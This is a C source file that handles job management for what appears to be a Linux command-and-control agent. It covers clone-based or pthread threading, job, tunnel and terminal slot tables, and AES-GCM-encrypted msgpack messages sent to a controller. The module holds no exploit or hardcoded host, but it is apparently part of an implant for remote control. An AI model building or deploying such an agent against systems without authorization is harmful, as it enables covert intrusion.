/// jobs.c -- Job management for Linux agent
/// Dual mode: static ELF (clone+spinlock) or SO (pthread via resolver)

#include "jobs.h"
#include "crt.h"
#include "crypt.h"
#include "msgpack.h"

#ifdef BUILD_SO
#include "elf_resolve.h"
#else
#ifdef ARCH_X86_64
#include "syscalls_x64.h"
#endif
#ifdef ARCH_AARCH64
#include "syscalls_aarch64.h"
#endif
#endif

/// Global job context instance
job_context_t g_job_ctx;

// ── Threading abstraction ──

#ifdef BUILD_SO

void jobs_mutex_init(pthread_mutex_t *m) {
    R_pthread_mutex_init(m, (void*)0);
}

void jobs_mutex_lock(pthread_mutex_t *m) {
    R_pthread_mutex_lock(m);
}

void jobs_mutex_unlock(pthread_mutex_t *m) {
    R_pthread_mutex_unlock(m);
}

int jobs_thread_create(pthread_t *tid, void *(*fn)(void*), void *arg) {
    pthread_t t;
    int ret = R_pthread_create(&t, (void*)0, fn, arg);
    if (ret == 0) {
        R_pthread_detach(t);
        if (tid) *tid = t;
    }
    return ret;
}

#else

// Static mode: spinlock + clone() with mmap'd stack

void jobs_mutex_init(pthread_mutex_t *m) {
    m->__lock = 0;
}

// Atomic swap: returns previous value, stores new_val
static inline int atomic_swap(volatile int *ptr, int new_val) {
#ifdef ARCH_X86_64
    return __sync_lock_test_and_set(ptr, new_val);
#else
    // ARM64: LDAXR/STLXR loop (no libgcc dependency)
    int old, tmp;
    __asm__ volatile(
        "1: ldaxr  %w0, [%2]    \n"
        "   stlxr  %w1, %w3, [%2] \n"
        "   cbnz   %w1, 1b      \n"
        : "=&r"(old), "=&r"(tmp)
        : "r"(ptr), "r"(new_val)
        : "memory"
    );
    return old;
#endif
}

static inline void atomic_store_release(volatile int *ptr, int val) {
#ifdef ARCH_X86_64
    __sync_lock_release(ptr);
#else
    __asm__ volatile("stlr %w0, [%1]" : : "r"(val), "r"(ptr) : "memory");
#endif
}

void jobs_mutex_lock(pthread_mutex_t *m) {
    while (atomic_swap(&m->__lock, 1)) {
        while (m->__lock) {
#ifdef ARCH_X86_64
            __asm__ volatile("pause");
#else
            __asm__ volatile("yield");
#endif
        }
    }
}

void jobs_mutex_unlock(pthread_mutex_t *m) {
    atomic_store_release(&m->__lock, 0);
}

#define THREAD_STACK_SIZE (256 * 1024)

// Trampoline for clone-based threads
typedef struct {
    void *(*fn)(void*);
    void *arg;
} clone_trampoline_t;

static int _clone_entry(void *param) {
    clone_trampoline_t *info = (clone_trampoline_t*)param;
    void *(*fn)(void*) = info->fn;
    void *arg = info->arg;
    ax_free(info);

    fn(arg);

    // Exit just this thread (with CLONE_THREAD, exit_group exits the thread)
    raw_syscall1(__NR_exit, 0);
    return 0;  // unreachable
}

int jobs_thread_create(pthread_t *tid, void *(*fn)(void*), void *arg) {
    // Allocate stack via mmap
    void *stack = sys_mmap((void*)0, THREAD_STACK_SIZE,
                           3 /*PROT_READ|PROT_WRITE*/,
                           0x22 /*MAP_PRIVATE|MAP_ANONYMOUS*/,
                           -1, 0);
    if ((long)stack <= 0) return -1;

    clone_trampoline_t *info = (clone_trampoline_t*)ax_malloc(sizeof(clone_trampoline_t));
    info->fn = fn;
    info->arg = arg;

    // Stack grows downward
    void *stack_top = (uint8_t*)stack + THREAD_STACK_SIZE;

    long ret = raw_syscall5(__NR_clone,
        (long)(CLONE_VM | CLONE_FS | CLONE_FILES | CLONE_SIGHAND | CLONE_THREAD),
        (long)stack_top,
        0, 0,
        (long)info);

    if (ret < 0) {
        ax_free(info);
        sys_munmap(stack, THREAD_STACK_SIZE);
        return -1;
    }

    if (ret == 0) {
        // Child thread
        _clone_entry(info);
        // unreachable
    }

    if (tid) *tid = (pthread_t)ret;
    return 0;
}

#endif // BUILD_SO

// ── Job context management ──

void jobs_init(job_context_t *ctx) {
    ax_memset(ctx, 0, sizeof(job_context_t));
    jobs_mutex_init(&ctx->jobs_mutex);
    jobs_mutex_init(&ctx->tunnels_mutex);
    jobs_mutex_init(&ctx->terminals_mutex);
}

void jobs_update_connection(job_context_t *ctx, const char *address,
                           int banner_size, const uint8_t *enc_key,
                           uint32_t profile_type) {
    ax_strncpy(ctx->address, address, sizeof(ctx->address) - 1);
    ctx->banner_size = banner_size;
    ax_memcpy(ctx->enc_key, enc_key, 16);
    ctx->profile_type = profile_type;
}

int jobs_open_connection(job_context_t *ctx, connector_t *conn) {
    if (conn_open(conn, ctx->address) != 0)
        return -1;

    if (ctx->banner_size > 0) {
        if (conn_discard(conn, (size_t)ctx->banner_size) != 0) {
            conn_close(conn);
            return -1;
        }
    }
    return 0;
}

int jobs_alloc(job_context_t *ctx) {
    jobs_mutex_lock(&ctx->jobs_mutex);
    for (int i = 0; i < MAX_JOBS; i++) {
        if (!ctx->jobs[i].active) {
            ax_memset(&ctx->jobs[i], 0, sizeof(job_entry_t));
            ctx->jobs[i].conn.fd = -1;
            jobs_mutex_unlock(&ctx->jobs_mutex);
            return i;
        }
    }
    jobs_mutex_unlock(&ctx->jobs_mutex);
    return -1;
}

int jobs_find(job_context_t *ctx, const char *job_id) {
    jobs_mutex_lock(&ctx->jobs_mutex);
    for (int i = 0; i < MAX_JOBS; i++) {
        if (ctx->jobs[i].active && ax_strcmp(ctx->jobs[i].job_id, job_id) == 0) {
            jobs_mutex_unlock(&ctx->jobs_mutex);
            return i;
        }
    }
    jobs_mutex_unlock(&ctx->jobs_mutex);
    return -1;
}

void jobs_remove(job_context_t *ctx, int idx) {
    jobs_mutex_lock(&ctx->jobs_mutex);
    if (idx >= 0 && idx < MAX_JOBS) {
        ctx->jobs[idx].active = 0;
        ctx->jobs[idx].job_id[0] = '\0';
    }
    jobs_mutex_unlock(&ctx->jobs_mutex);
}

int tunnels_find(job_context_t *ctx, int channel_id) {
    jobs_mutex_lock(&ctx->tunnels_mutex);
    for (int i = 0; i < MAX_TUNNELS; i++) {
        if (ctx->tunnels[i].active && ctx->tunnels[i].channel_id == channel_id) {
            jobs_mutex_unlock(&ctx->tunnels_mutex);
            return i;
        }
    }
    jobs_mutex_unlock(&ctx->tunnels_mutex);
    return -1;
}

int terminals_find(job_context_t *ctx, int term_id) {
    jobs_mutex_lock(&ctx->terminals_mutex);
    for (int i = 0; i < MAX_TERMINALS; i++) {
        if (ctx->terminals[i].active && ctx->terminals[i].term_id == term_id) {
            jobs_mutex_unlock(&ctx->terminals_mutex);
            return i;
        }
    }
    jobs_mutex_unlock(&ctx->terminals_mutex);
    return -1;
}

int jobs_send_init(job_context_t *ctx, connector_t *conn,
                   int pack_type, const uint8_t *pack_data, uint32_t pack_len) {
    mp_writer_t outer;
    mp_writer_init(&outer, 256);
    mp_write_map(&outer, 2);
    mp_write_kv_int(&outer, "id", pack_type);
    mp_write_kv_bin(&outer, "data", pack_data, pack_len);

    size_t enc_len;
    uint8_t *encrypted = aes128_gcm_encrypt(outer.buf.data, outer.buf.len,
                                             ctx->enc_key, &enc_len);
    mp_writer_free(&outer);
    if (!encrypted) return -1;

    int ret = conn_send_msg(conn, encrypted, enc_len);
    ax_free(encrypted);
    return ret;
}

int jobs_send_message(job_context_t *ctx, connector_t *conn,
                      uint32_t command_id, const char *job_id,
                      const uint8_t *data, uint32_t data_len) {
    mp_writer_t job_w;
    mp_writer_init(&job_w, 256 + data_len);
    mp_write_map(&job_w, 3);
    mp_write_kv_uint(&job_w, "command_id", command_id);
    mp_write_kv_str(&job_w, "job_id", job_id);
    mp_write_kv_bin(&job_w, "data", data, data_len);

    mp_writer_t msg_w;
    mp_writer_init(&msg_w, 256 + job_w.buf.len);
    mp_write_map(&msg_w, 2);
    mp_write_kv_int(&msg_w, "type", 2);
    mp_write_str(&msg_w, "object", 6);
    mp_write_array(&msg_w, 1);
    mp_write_bin(&msg_w, job_w.buf.data, (uint32_t)job_w.buf.len);
    mp_writer_free(&job_w);

    size_t enc_len;
    uint8_t *encrypted = aes128_gcm_encrypt(msg_w.buf.data, msg_w.buf.len,
                                             ctx->session_key, &enc_len);
    mp_writer_free(&msg_w);
    if (!encrypted) return -1;

    int ret = conn_send_msg(conn, encrypted, enc_len);
    ax_free(encrypted);
    return ret;
}
